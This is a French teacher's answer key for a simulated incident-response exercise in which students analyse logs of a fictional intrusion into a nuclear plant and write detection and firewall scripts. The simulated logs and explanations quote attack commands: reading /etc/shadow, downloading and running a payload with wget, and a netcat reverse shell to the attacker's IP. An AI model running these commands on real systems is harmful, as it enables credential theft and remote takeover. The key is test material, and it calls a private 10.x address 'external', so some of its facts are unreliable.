# 🔑 CORRIGÉ — OPÉRATION RÉACTEUR-7

## Solutions complètes — Tous les niveaux

> **⚠️ DOCUMENT RÉSERVÉ À L'ENSEIGNANT — Ne pas distribuer aux étudiants**

---

## 🎮 NIVEAU 1 — Analyse des Logs

---

### Mission 1.1 — Trouver l'intrus (grep)

**Question :** Quelle adresse IP externe apparaît dans les logs d'accès ?

**Commande :**

```bash
grep -v "SRC=192.168.1" logs_centrale/access.log
```

**Résultat attendu :**

```
[2026-03-14 02:31:45] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:46] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:47] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:10] SRC=10.0.0.55 DST=192.168.1.201 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:11] SRC=10.0.0.55 DST=192.168.1.202 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:05] SRC=10.0.0.55 DST=192.168.1.200 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:06] SRC=10.0.0.55 DST=192.168.1.203 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=9999 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:00] SRC=10.0.0.55 DST=192.168.1.204 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:36:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:00] SRC=10.0.0.55 DST=192.168.1.205 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
```

**Réponse :** L'adresse IP suspecte est **`10.0.0.55`** — elle provient d'un réseau externe (10.x.x.x) et non du réseau interne de la centrale (192.168.1.x).

> **💡 Note pédagogique :** On utilise `grep -v "SRC=192.168.1"` (avec le préfixe `SRC=`) plutôt que simplement `grep -v "192.168.1"` car toutes les lignes contiennent `192.168.1` dans le champ DST. Sans le préfixe `SRC=`, grep exclurait TOUTES les lignes et ne retournerait rien.

---

**Question bonus :** Combien de fois cette IP apparaît-elle ?

**Commande :**

```bash
grep -c "10.0.0.55" logs_centrale/access.log
```

**Résultat :**

```
15
```

**Réponse :** L'IP `10.0.0.55` apparaît **15 fois** dans le fichier access.log.

---

### Mission 1.2 — Identifier les ports suspects (awk)

**Question :** Quels ports non-standards sont utilisés par l'attaquant ?

**Commande :**

```bash
grep "10.0.0.55" logs_centrale/access.log | awk '{print $4}' | sed 's/PORT=//' | sort -u
```

**Résultat :**

```
31337
4444
9999
```

**Réponse :** Les trois ports suspects sont :

| Port | Signification |
|------|--------------|
| **4444** | Port par défaut de **Metasploit** pour les reverse shells |
| **31337** | **"eleet"** (elite) en langage hacker — port historique de backdoors |
| **9999** | Souvent utilisé pour l'**exfiltration de données** |

**Explication de la commande :**
- `grep "10.0.0.55"` → filtre uniquement les lignes de l'attaquant
- `awk '{print $4}'` → extrait le 4ᵉ champ (PORT=XXXX)
- `sed 's/PORT=//'` → retire le préfixe "PORT=" pour garder seulement le numéro
- `sort -u` → trie et élimine les doublons

---

### Mission 1.3 — Analyser les capteurs (awk + sed)

**Question :** Trouvez toutes les entrées où les capteurs montrent des valeurs anormales.

**Commande :**

```bash
grep -v "NORMAL" logs_centrale/capteurs.log
```

**Résultat :**

```
[2026-03-14 02:32:00] CAPTEUR=TEMP_REACT_7 VALEUR=350.8 UNITE=°C STATUS=ALERTE
[2026-03-14 02:32:30] CAPTEUR=PRESSION_REACT_7 VALEUR=170.3 UNITE=bar STATUS=ALERTE
[2026-03-14 02:33:00] CAPTEUR=TEMP_REACT_7 VALEUR=425.9 UNITE=°C STATUS=CRITIQUE
[2026-03-14 02:33:30] CAPTEUR=PRESSION_REACT_7 VALEUR=189.7 UNITE=bar STATUS=CRITIQUE
[2026-03-14 02:35:00] CAPTEUR=TEMP_REACT_7 VALEUR=510.2 UNITE=°C STATUS=DANGER
[2026-03-14 02:35:30] CAPTEUR=PRESSION_REACT_7 VALEUR=210.5 UNITE=bar STATUS=DANGER
[2026-03-14 02:37:00] CAPTEUR=TEMP_REACT_7 VALEUR=480.3 UNITE=°C STATUS=DANGER
[2026-03-14 02:37:30] CAPTEUR=PRESSION_REACT_7 VALEUR=205.8 UNITE=bar STATUS=DANGER
```

---

**Question :** Extraire uniquement les valeurs de température et leur status.

**Commande :**

```bash
grep "TEMP_REACT_7" logs_centrale/capteurs.log | awk '{print $3, $5}'
```

**Résultat :**

```
VALEUR=312.5 STATUS=NORMAL
VALEUR=313.1 STATUS=NORMAL
VALEUR=350.8 STATUS=ALERTE
VALEUR=425.9 STATUS=CRITIQUE
VALEUR=287.0 STATUS=NORMAL
VALEUR=510.2 STATUS=DANGER
VALEUR=295.0 STATUS=NORMAL
VALEUR=480.3 STATUS=DANGER
VALEUR=301.0 STATUS=NORMAL
```

---

**Question :** Est-ce que les valeurs sont vraiment anormales ou est-ce que l'attaquant les falsifie ?

**Réponse :** Les valeurs sont **falsifiées par l'attaquant**. La preuve :

- Les pics de température (350°C, 425°C, 510°C, 480°C) apparaissent à **02:32, 02:33, 02:35, 02:37**
- L'IP `10.0.0.55` est active sur le port 4444 exactement aux mêmes moments dans `access.log`
- Entre les pics, la température revient à des valeurs normales (~287-301°C), ce qui est physiquement impossible pour un réacteur nucléaire (la température ne peut pas chuter de 510°C à 287°C en 1 minute)
- Le script `serveur_pirate.sh` confirme : `"Capteur TEMP_REACT_7 : valeur modifiée → 510.2°C (réelle: 312°C)"`

**Conclusion :** L'attaquant manipule les données des capteurs pour créer la panique et potentiellement provoquer un arrêt d'urgence injustifié du réacteur.

---

### Mission 1.4 — Analyser les tentatives d'authentification

**Question :** L'attaquant a-t-il réussi à s'authentifier ? Avec quel compte ?

**Commande :**

```bash
grep "10.0.0.55" logs_centrale/auth.log
```

**Résultat :**

```
[2026-03-14 02:31:45] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:46] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:47] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:48] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:49] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:50] USER=operateur1 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:51] USER=operateur2 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:52] USER=test IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:53] USER=guest IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:33:05] USER=maintenance IP=10.0.0.55 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:10] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="cat /etc/shadow"
[2026-03-14 02:33:15] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="wget http://10.0.0.55/payload.sh"
[2026-03-14 02:33:20] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="chmod +x payload.sh"
[2026-03-14 02:33:25] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="./payload.sh"
[2026-03-14 02:35:00] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="crontab -e"
```

---

**Commande pour voir uniquement les connexions réussies :**

```bash
grep "10.0.0.55" logs_centrale/auth.log | grep "SUCCESS"
```

**Résultat :**

```
[2026-03-14 02:33:05] USER=maintenance IP=10.0.0.55 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:10] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="cat /etc/shadow"
[2026-03-14 02:33:15] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="wget http://10.0.0.55/payload.sh"
[2026-03-14 02:33:20] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="chmod +x payload.sh"
[2026-03-14 02:33:25] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="./payload.sh"
[2026-03-14 02:35:00] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="crontab -e"
```

**Réponse :** Oui, l'attaquant a réussi avec le compte **`maintenance`**.

---

**Question :** Quelles commandes l'attaquant a-t-il exécutées ?

**Commande :**

```bash
grep "10.0.0.55" logs_centrale/auth.log | grep "SUDO" | sed 's/.*CMD="//' | sed 's/"//'
```

**Résultat :**

```
cat /etc/shadow
wget http://10.0.0.55/payload.sh
chmod +x payload.sh
./payload.sh
crontab -e
```

**Analyse détaillée des commandes :**

| # | Commande | Explication |
|---|----------|-------------|
| 1 | `cat /etc/shadow` | Vol des mots de passe hashés du système |
| 2 | `wget http://10.0.0.55/payload.sh` | Téléchargement d'un malware depuis son propre serveur |
| 3 | `chmod +x payload.sh` | Rend le malware exécutable |
| 4 | `./payload.sh` | Exécution du malware (ouvre les backdoors, falsifie les capteurs) |
| 5 | `crontab -e` | Crée une tâche planifiée pour assurer la **persistance** (le malware se relancera automatiquement) |

**Résumé de l'attaque :** Brute force → compromission du compte `maintenance` → vol de données → installation de malware → persistance.

---

## 🎮 NIVEAU 2 — Surveillance Réseau

---

### Mission 2.1 — Analyser les connexions actives

**Commande :**

```bash
grep "10.0.0.55" logs_centrale/connexions_actives.txt
```

**Résultat :**

```
tcp    192.168.1.200:4444     10.0.0.55:61234        ESTABLISHED  9999/nc
tcp    192.168.1.200:31337    10.0.0.55:55012        ESTABLISHED  9998/python3
tcp    192.168.1.201:4444     10.0.0.55:61235        ESTABLISHED  10001/nc
tcp    192.168.1.203:31337    10.0.0.55:55100        ESTABLISHED  10002/python3
```

---

**Commande pour extraire les détails :**

```bash
grep "10.0.0.55" logs_centrale/connexions_actives.txt | awk '{print $3, $4, $6}'
```

**Résultat :**

```
192.168.1.200:4444 10.0.0.55:61234 9999/nc
192.168.1.200:31337 10.0.0.55:55012 9998/python3
192.168.1.201:4444 10.0.0.55:61235 10001/nc
192.168.1.203:31337 10.0.0.55:55100 10002/python3
```

**Analyse :**

| Machine compromise | Port | Programme | Signification |
|-------------------|------|-----------|---------------|
| 192.168.1.200 | 4444 | `nc` (netcat) | **Reverse shell** — accès distant au terminal |
| 192.168.1.200 | 31337 | `python3` | **Backdoor** — script malveillant Python |
| 192.168.1.201 | 4444 | `nc` | Reverse shell sur une 2ᵉ machine |
| 192.168.1.203 | 31337 | `python3` | Backdoor sur une 3ᵉ machine |

**Conclusion :** L'attaquant a compromis **3 machines** (192.168.1.200, .201, .203) et maintient **4 connexions actives** via netcat et Python.

---

### Mission 2.2 — Comprendre netcat

**Explication attendue :**

| Commande | Rôle |
|----------|------|
| `nc -l -p 4444` | netcat **écoute** (`-l` = listen) sur le port 4444. C'est le **serveur de l'attaquant** qui attend qu'une machine compromise se connecte à lui. |
| `nc localhost 4444` | netcat **se connecte** au port 4444. C'est la **machine victime** qui envoie des données vers le serveur de l'attaquant. |

**Comment ça marche dans l'attaque :**
1. L'attaquant lance `nc -l -p 4444` sur sa machine (10.0.0.55)
2. Le malware `payload.sh` exécute `nc 10.0.0.55 4444 -e /bin/bash` sur la machine victime
3. L'attaquant obtient un **shell distant** — il peut exécuter des commandes sur la machine victime comme s'il était devant

---

### Mission 2.3 — Identifier les adresses IP et les réseaux

| Adresse IP | Réseau | Rôle probable | Preuve dans les logs |
|-----------|--------|---------------|---------------------|
| 192.168.1.10 | Interne (LAN) | Poste opérateur | Accède aux ports 443 (HTTPS) et 80 (HTTP) |
| 192.168.1.12 | Interne (LAN) | Poste administrateur | Accède au port 22 (SSH), user=admin |
| 192.168.1.15 | Interne (LAN) | Poste superviseur | user=superviseur dans auth.log |
| 192.168.1.20 | Interne (LAN) | Serveur base de données | Port 3306 (MySQL) |
| 192.168.1.25 | Interne (LAN) | Serveur applicatif | Port 8080 (Tomcat) |
| 192.168.1.100 | Interne (LAN) | Serveur principal | Destination de la plupart des connexions internes (nginx, sshd, mysqld) |
| 192.168.1.200 | Interne (LAN) | **Serveur compromis** (cible principale) | Destination des connexions de 10.0.0.55, nc et python3 en écoute |
| 192.168.1.201 | Interne (LAN) | **2ᵉ machine compromise** | nc en écoute sur port 4444 |
| 192.168.1.203 | Interne (LAN) | **3ᵉ machine compromise** | python3 en écoute sur port 31337 |
| **10.0.0.55** | **Externe** | **Machine de l'attaquant** | Source de toutes les connexions suspectes |

---

### Mission 2.4 — Timeline de l'attaque

**Commande :**

```bash
grep "10.0.0.55" logs_centrale/access.log logs_centrale/auth.log | sort -t']' -k1
```

**Chronologie complète reconstituée :**

| Heure | Événement | Fichier source |
|-------|-----------|---------------|
| **02:31:45** | Première connexion sur le port 4444 (reverse shell établi) | access.log |
| **02:31:45-53** | Attaque par **brute force** SSH : test de root, admin, operateur1, operateur2, test, guest — tous FAILED | auth.log |
| **02:32:00** | Capteur température passe à 350.8°C (ALERTE) — début de la falsification | capteurs.log |
| **02:32:10-11** | Propagation vers les machines .201 et .202 (port 4444) | access.log |
| **02:33:00** | Connexion persistante sur port 4444 | access.log |
| **02:33:05** | **Connexion réussie** avec le compte `maintenance` | auth.log |
| **02:33:05** | Ouverture du port 31337 (backdoor secondaire) | access.log |
| **02:33:10** | `cat /etc/shadow` — vol des mots de passe | auth.log |
| **02:33:15** | `wget payload.sh` — téléchargement du malware | auth.log |
| **02:33:20** | `chmod +x payload.sh` — préparation du malware | auth.log |
| **02:33:25** | `./payload.sh` — **exécution du malware** | auth.log |
| **02:34:00** | Continuation des connexions port 4444 | access.log |
| **02:34:15** | Ouverture du port **9999** — début de l'**exfiltration** de données | access.log |
| **02:35:00** | `crontab -e` — mise en place de la **persistance** | auth.log |
| **02:35:00** | Propagation vers .204 (port 4444) | access.log |
| **02:37:00** | Propagation vers .205 (port 31337) | access.log |

**Synthèse du schéma d'attaque :**

```
Phase 1 : Reconnaissance    → Connexion initiale (port 4444)
Phase 2 : Accès initial     → Brute force SSH (9 tentatives, 6 comptes)
Phase 3 : Compromission     → Login avec "maintenance"
Phase 4 : Élévation         → sudo + vol de /etc/shadow
Phase 5 : Installation      → Téléchargement et exécution de payload.sh
Phase 6 : Propagation       → Backdoors sur .200, .201, .203, .204, .205
Phase 7 : Exfiltration      → Port 9999 (vol de données)
Phase 8 : Persistance       → crontab (malware se relance au reboot)
Phase 9 : Sabotage          → Falsification des capteurs du réacteur
```

---

## 🎮 NIVEAU 3 — Scripts de Défense

---

### Mission 3.1 — Script de détection d'IP suspecte (`detecteur.sh`)

```bash
#!/bin/bash
# detecteur.sh — Détecte les IP externes dans un fichier de log
# Usage : bash detecteur.sh fichier.log

if [ -z "$1" ]; then
    echo "Usage: bash detecteur.sh <fichier_log>"
    exit 1
fi

echo "=== Analyse de $1 ==="
echo "IP suspectes détectées :"
echo ""

grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$1" | \
    grep -v "^192\.168\.1\." | \
    sort -u

echo ""
echo "Nombre de connexions par IP suspecte :"
grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$1" | \
    grep -v "^192\.168\.1\." | \
    sort | uniq -c | sort -rn
```

**Test et résultat attendu :**

```bash
$ bash detecteur.sh logs_centrale/access.log
=== Analyse de logs_centrale/access.log ===
IP suspectes détectées :

10.0.0.55

Nombre de connexions par IP suspecte :
     15 10.0.0.55
```

**Explication ligne par ligne :**

| Ligne | Rôle |
|-------|------|
| `if [ -z "$1" ]` | Vérifie qu'un argument (fichier) a été fourni |
| `grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'` | Extrait toutes les adresses IP du fichier (`-o` = seulement le match, `-E` = regex étendue) |
| `grep -v "^192\.168\.1\."` | Exclut les IP du réseau interne |
| `sort -u` | Trie et déduplique pour avoir la liste des IP uniques |
| `sort \| uniq -c \| sort -rn` | Compte les occurrences de chaque IP et trie par fréquence décroissante |

---

### Mission 3.2 — Script de blocage de ports (`bloquer_ports.sh`)

```bash
#!/bin/bash
# bloquer_ports.sh — Génère les règles iptables pour bloquer les ports suspects
# Usage : bash bloquer_ports.sh

echo "=== Générateur de règles Firewall ==="
echo "Analyse des ports suspects..."
echo ""

# Extraire les ports suspects (SERVICE=UNKNOWN)
ports_suspects=$(grep "UNKNOWN" logs_centrale/access.log | \
    grep -oE 'PORT=[0-9]+' | \
    sed 's/PORT=//' | \
    sort -u)

echo "Ports suspects identifiés :"
for port in $ports_suspects; do
    echo "  ⚠ Port $port"
done

echo ""
echo "Règles iptables à appliquer :"
echo "------------------------------"

for port in $ports_suspects; do
    echo "iptables -A INPUT -p tcp --dport $port -j DROP"
    echo "iptables -A OUTPUT -p tcp --dport $port -j DROP"
done

# Bloquer l'IP de l'attaquant
echo ""
echo "# Blocage complet de l'IP attaquante :"
echo "iptables -A INPUT -s 10.0.0.55 -j DROP"
echo "iptables -A OUTPUT -d 10.0.0.55 -j DROP"

echo ""
echo "✅ Copiez ces règles et exécutez-les avec sudo pour protéger le système."
echo "   (Simulation — ne pas exécuter en vrai !)"
```

**Résultat attendu :**

```
=== Générateur de règles Firewall ===
Analyse des ports suspects...

Ports suspects identifiés :
  ⚠ Port 31337
  ⚠ Port 4444
  ⚠ Port 9999

Règles iptables à appliquer :
------------------------------
iptables -A INPUT -p tcp --dport 31337 -j DROP
iptables -A OUTPUT -p tcp --dport 31337 -j DROP
iptables -A INPUT -p tcp --dport 4444 -j DROP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A INPUT -p tcp --dport 9999 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP

# Blocage complet de l'IP attaquante :
iptables -A INPUT -s 10.0.0.55 -j DROP
iptables -A OUTPUT -d 10.0.0.55 -j DROP
```

**Explication des règles iptables :**

| Règle | Signification |
|-------|---------------|
| `-A INPUT` | Ajoute une règle pour le trafic **entrant** |
| `-A OUTPUT` | Ajoute une règle pour le trafic **sortant** |
| `-p tcp` | Protocole TCP |
| `--dport 4444` | Port de destination 4444 |
| `-j DROP` | Action : **bloquer silencieusement** (pas de réponse à l'attaquant) |
| `-s 10.0.0.55` | Source = IP de l'attaquant |
| `-d 10.0.0.55` | Destination = IP de l'attaquant |

---

### Mission 3.3 — Script Python d'alerte (`alerte.py`)

```python
#!/usr/bin/env python3
"""
alerte.py — Système d'alerte pour les capteurs du réacteur
Usage : python3 alerte.py
"""

TEMP_MAX = 320.0  # Température maximale normale en °C

print("=" * 60)
print("  SYSTÈME D'ALERTE — Réacteur 7")
print("=" * 60)
print()

alertes = 0

with open("logs_centrale/capteurs.log", "r") as f:
    for ligne in f:
        if "TEMP_REACT_7" in ligne:
            # Extraire la valeur de température
            parties = ligne.split()
            for partie in parties:
                if partie.startswith("VALEUR="):
                    valeur = float(partie.split("=")[1])
                    # Extraire l'heure
                    heure = ligne.split("]")[0].replace("[", "")

                    if valeur > TEMP_MAX:
                        alertes += 1
                        if valeur > 450:
                            niveau = "🔴 DANGER"
                        elif valeur > 350:
                            niveau = "🟡 CRITIQUE"
                        else:
                            niveau = "🟠 ALERTE"

                        print(f"  {niveau} | {heure} | Température: {valeur}°C (max: {TEMP_MAX}°C)")

print()
print(f"  Total des alertes : {alertes}")
print()

if alertes > 3:
    print("  ⚠️  RECOMMANDATION : Les données semblent manipulées.")
    print("     Les pics de température coïncident avec l'activité de l'attaquant.")
    print("     Vérifier les capteurs physiquement avant toute action.")
```

**Résultat attendu :**

```
============================================================
  SYSTÈME D'ALERTE — Réacteur 7
============================================================

  🟠 ALERTE   | 2026-03-14 02:32:00 | Température: 350.8°C (max: 320.0°C)
  🟡 CRITIQUE | 2026-03-14 02:33:00 | Température: 425.9°C (max: 320.0°C)
  🔴 DANGER   | 2026-03-14 02:35:00 | Température: 510.2°C (max: 320.0°C)
  🔴 DANGER   | 2026-03-14 02:37:00 | Température: 480.3°C (max: 320.0°C)

  Total des alertes : 4

  ⚠️  RECOMMANDATION : Les données semblent manipulées.
     Les pics de température coïncident avec l'activité de l'attaquant.
     Vérifier les capteurs physiquement avant toute action.
```

**Points clés du code :**

| Concept Python | Utilisation |
|----------------|-------------|
| `open("fichier", "r")` | Ouvrir un fichier en lecture |
| `for ligne in f` | Lire ligne par ligne |
| `ligne.split()` | Découper une ligne en mots |
| `partie.startswith("VALEUR=")` | Vérifier le début d'un mot |
| `float(...)` | Convertir texte en nombre décimal |
| `f"..."` | f-string — formatage moderne Python 3.6+ |

---

### Mission 3.4 — Script de surveillance continue (`moniteur.sh`)

```bash
#!/bin/bash
# moniteur.sh — Surveillance en temps réel
# Usage : bash moniteur.sh fichier.log

if [ -z "$1" ]; then
    echo "Usage: bash moniteur.sh <fichier_log>"
    exit 1
fi

IP_DANGER="10.0.0.55"

echo "🔍 Surveillance de $1 en cours..."
echo "   Alerte si l'IP $IP_DANGER est détectée"
echo "   (Ctrl+C pour arrêter)"
echo ""

tail -f "$1" | while read ligne; do
    if echo "$ligne" | grep -q "$IP_DANGER"; then
        echo "🚨 ALERTE [$(date '+%H:%M:%S')] : Activité détectée !"
        echo "   → $ligne"
        echo ""
    fi
done
```

**Comment tester :**

Terminal 1 — Lancer le moniteur :
```bash
bash moniteur.sh logs_centrale/access.log
```

Terminal 2 — Simuler une nouvelle entrée suspecte :
```bash
echo '[2026-03-14 02:40:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN' >> logs_centrale/access.log
```

**Résultat dans le Terminal 1 :**
```
🚨 ALERTE [14:35:22] : Activité détectée !
   → [2026-03-14 02:40:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
```

**Explication :**

| Commande | Rôle |
|----------|------|
| `tail -f "$1"` | Affiche les **nouvelles lignes** ajoutées au fichier en temps réel (`-f` = follow) |
| `while read ligne` | Boucle qui lit chaque nouvelle ligne |
| `grep -q` | Recherche silencieuse (`-q` = quiet, retourne seulement le code de sortie) |
| `$(date '+%H:%M:%S')` | Insère l'heure actuelle dans l'alerte |

---

## 🎮 NIVEAU 4 — Rapport Final

---

### Exemple de rapport d'incident complet

> **RAPPORT D'INCIDENT DE SÉCURITÉ**
> **Centrale nucléaire Gentilly-3 — Réacteur 7**
> **Date de l'incident : 14 mars 2026**
>
> ---
>
> **1. Identification de l'attaquant**
>
> L'attaque a été menée depuis l'adresse IP **10.0.0.55**, appartenant à un réseau externe (10.0.0.0/8). Cette IP a effectué **15 connexions** vers notre réseau interne en l'espace de 6 minutes.
>
> **2. Méthode d'intrusion**
>
> L'attaquant a d'abord établi un **reverse shell** via le port 4444, puis a mené une attaque par **brute force** sur le service SSH (port 22), testant les comptes : `root`, `admin`, `operateur1`, `operateur2`, `test`, `guest`. Il a finalement réussi à se connecter avec le compte **`maintenance`** à 02:33:05.
>
> **3. Actions malveillantes**
>
> Une fois connecté, l'attaquant a :
> - Volé le fichier `/etc/shadow` (mots de passe hashés)
> - Téléchargé et exécuté un malware (`payload.sh`)
> - Ouvert des backdoors sur les ports **4444** et **31337**
> - **Falsifié les données** des capteurs de température (310°C → 510°C) et de pression (155 bar → 210 bar)
> - Mis en place une tâche cron pour assurer la **persistance**
> - Propagé l'attaque à **4 autres machines** (.201, .202, .204, .205)
> - Commencé l'**exfiltration de données** via le port 9999
>
> **4. Impact**
>
> - Risque de **panique injustifiée** due aux fausses alarmes des capteurs
> - Possible **arrêt d'urgence du réacteur** basé sur de fausses données
> - **Compromission de 5 machines** du réseau interne
> - **Vol de données sensibles** (mots de passe, données de configuration)
>
> **5. Mesures correctives recommandées**
>
> | # | Action | Priorité |
> |---|--------|----------|
> | 1 | Bloquer l'IP 10.0.0.55 au niveau du firewall | **IMMÉDIATE** |
> | 2 | Fermer les ports 4444, 31337, 9999 | **IMMÉDIATE** |
> | 3 | Désactiver le compte `maintenance` | **IMMÉDIATE** |
> | 4 | Réinitialiser TOUS les mots de passe (/etc/shadow compromis) | **URGENTE** |
> | 5 | Supprimer le malware payload.sh et la tâche cron | **URGENTE** |
> | 6 | Vérifier physiquement les capteurs du réacteur | **URGENTE** |
> | 7 | Scanner les 5 machines compromises | **HAUTE** |
> | 8 | Installer un IDS (Système de Détection d'Intrusion) | **PLANIFIÉE** |
> | 9 | Limiter les tentatives SSH (fail2ban) | **PLANIFIÉE** |
> | 10 | Segmenter le réseau (capteurs sur VLAN isolé) | **PLANIFIÉE** |

---

## 📝 Barème de correction suggéré

| Niveau | Critère | Points |
|--------|---------|--------|
| **1.1** | Identifier l'IP 10.0.0.55 avec grep | /5 |
| **1.1 bonus** | Compter les occurrences (grep -c) | /2 |
| **1.2** | Extraire les 3 ports suspects (awk + sed + sort) | /5 |
| **1.3** | Trouver les valeurs anormales + expliquer la falsification | /5 |
| **1.4** | Trouver le compte maintenance + lister les commandes | /5 |
| **2.1** | Identifier les connexions suspectes + programmes | /5 |
| **2.2** | Expliquer netcat (écoute vs connexion) | /3 |
| **2.3** | Tableau des IP complet | /5 |
| **2.4** | Timeline de l'attaque (au moins 5 étapes chronologiques) | /5 |
| **3.1** | Script detecteur.sh fonctionnel | /10 |
| **3.2** | Script bloquer_ports.sh fonctionnel | /10 |
| **3.3** | Script alerte.py fonctionnel | /10 |
| **3.4** | Script moniteur.sh fonctionnel | /10 |
| **4** | Rapport d'incident (5 sections : qui, comment, quoi, impact, solutions) | /15 |
| | **TOTAL** | **/100** |

---

## 🔧 Commandes-clés — Aide-mémoire

| Commande | Syntaxe | Description |
|----------|---------|-------------|
| `grep` | `grep "motif" fichier` | Cherche un motif dans un fichier |
| `grep -v` | `grep -v "motif" fichier` | Affiche les lignes qui ne contiennent PAS le motif |
| `grep -c` | `grep -c "motif" fichier` | Compte le nombre de lignes correspondantes |
| `grep -oE` | `grep -oE 'regex' fichier` | Extrait uniquement les correspondances (regex étendue) |
| `awk` | `awk '{print $N}' fichier` | Extrait la Nᵉ colonne |
| `sed` | `sed 's/ancien/nouveau/' fichier` | Remplace du texte |
| `sort` | `sort fichier` | Trie les lignes |
| `sort -u` | `sort -u fichier` | Trie et supprime les doublons |
| `sort -rn` | `sort -rn fichier` | Tri numérique inversé |
| `uniq -c` | `uniq -c` | Compte les lignes identiques consécutives |
| `wc -l` | `wc -l fichier` | Compte le nombre de lignes |
| `tail -f` | `tail -f fichier` | Suit le fichier en temps réel |
| `\|` (pipe) | `cmd1 \| cmd2` | Envoie la sortie de cmd1 comme entrée de cmd2 |
| `nc -l -p` | `nc -l -p PORT` | netcat en mode écoute |
| `iptables` | `iptables -A INPUT -p tcp --dport PORT -j DROP` | Bloquer un port entrant |
